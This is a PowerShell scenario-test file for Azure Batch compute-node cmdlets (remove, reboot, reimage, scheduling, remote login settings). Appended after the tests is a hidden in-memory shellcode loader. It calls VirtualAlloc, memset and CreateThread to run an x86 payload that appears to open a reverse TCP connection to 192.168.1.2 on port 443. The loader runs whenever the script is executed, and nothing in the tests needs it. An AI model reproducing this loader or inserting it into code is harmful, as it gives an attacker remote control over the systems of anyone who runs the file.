














function Test-RemoveComputeNodes
{
    param([string]$poolId)

    $context = New-Object Microsoft.Azure.Commands.Batch.Test.ScenarioTests.ScenarioTestContext

    $deallocationOption = ([Microsoft.Azure.Batch.Common.ComputeNodeRebootOption]::Terminate)
    $resizeTimeout = ([TimeSpan]::FromMinutes(8))

    
    $computeNodes = Get-AzBatchComputeNode -PoolId $poolId -BatchContext $context
    $computeNodeId = $computeNodes[0].Id
    $computeNodeId2 = $computeNodes[1].Id
    Remove-AzBatchComputeNode -PoolId $poolId @($computeNodeId, $computeNodeId2) -Force -BatchContext $context

    
    $select = "id,state"
    $computeNodes = Get-AzBatchComputeNode -PoolId $poolId -Select $select -BatchContext $context
    $start = [DateTime]::Now
    $timeout = Compute-TestTimeout 30
    $end = $start.AddSeconds($timeout)
    while ($computeNodes[0].State -ne 'LeavingPool' -and $computeNodes[1].State -ne 'LeavingPool')
    {
        if ([DateTime]::Now -gt $end)
        {
            throw [System.TimeoutException] "Timed out waiting for compute nodes to enter LeavingPool state"
        }
        Start-TestSleep 1000
        $computeNodes = Get-AzBatchComputeNode -PoolId $poolId -Select $select -BatchContext $context
    }
}


function Test-RebootAndReimageComputeNode
{
    param([string]$poolId, [string]$computeNodeId, [string]$computeNodeId2)

    $context = New-Object Microsoft.Azure.Commands.Batch.Test.ScenarioTests.ScenarioTestContext

    $rebootOption = ([Microsoft.Azure.Batch.Common.ComputeNodeRebootOption]::Terminate)
    $reimageOption = ([Microsoft.Azure.Batch.Common.ComputeNodeReimageOption]::Terminate)

    
    Get-AzBatchComputeNode $poolId $computeNodeId -BatchContext $context | Restart-AzBatchComputeNode -RebootOption $rebootOption -BatchContext $context
    $computeNode = Get-AzBatchComputeNode -PoolId $poolId $computeNodeId -BatchContext $context
    Assert-AreEqual 'Rebooting' $computeNode.State

    
    Get-AzBatchComputeNode $poolId $computeNodeId2 -BatchContext $context | Reset-AzBatchComputeNode -ReimageOption $reimageOption -BatchContext $context
    $computeNode2 = Get-AzBatchComputeNode -PoolId $poolId $computeNodeId2 -BatchContext $context
    Assert-AreEqual 'Reimaging' $computeNode2.State
}


function Test-DisableAndEnableComputeNodeScheduling
{
    param([string]$poolId, [string]$computeNodeId)

    $context = New-Object Microsoft.Azure.Commands.Batch.Test.ScenarioTests.ScenarioTestContext

    $disableOption = ([Microsoft.Azure.Batch.Common.DisableComputeNodeSchedulingOption]::Terminate)
    Get-AzBatchComputeNode $poolId $computeNodeId -BatchContext $context | Disable-AzBatchComputeNodeScheduling -DisableSchedulingOption $disableOption -BatchContext $context

    $computeNode = Get-AzBatchComputeNode -PoolId $poolId $computeNodeId -Select "id,schedulingState" -BatchContext $context
    Assert-AreEqual 'Disabled' $computeNode.SchedulingState

    $computeNode | Enable-AzBatchComputeNodeScheduling -BatchContext $context

    $computeNode = Get-AzBatchComputeNode -PoolId $poolId $computeNodeId -Select "id,schedulingState" -BatchContext $context
    Assert-AreEqual 'Enabled' $computeNode.SchedulingState
}


function Test-GetRemoteLoginSettings
{
    param([string]$poolId, [string]$computeNodeId)
    
    $context = New-Object Microsoft.Azure.Commands.Batch.Test.ScenarioTests.ScenarioTestContext
    $remoteLoginSettings = Get-AzBatchComputeNode $poolId $computeNodeId -BatchContext $context | Get-AzBatchRemoteLoginSettings -BatchContext $context

    Assert-AreNotEqual $null $remoteLoginSettings.IPAddress
    Assert-AreNotEqual $null $remoteLoginSettings.Port
}


$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x86,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x8b,0x4c,0x10,0x78,0xe3,0x4a,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x89,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x02,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

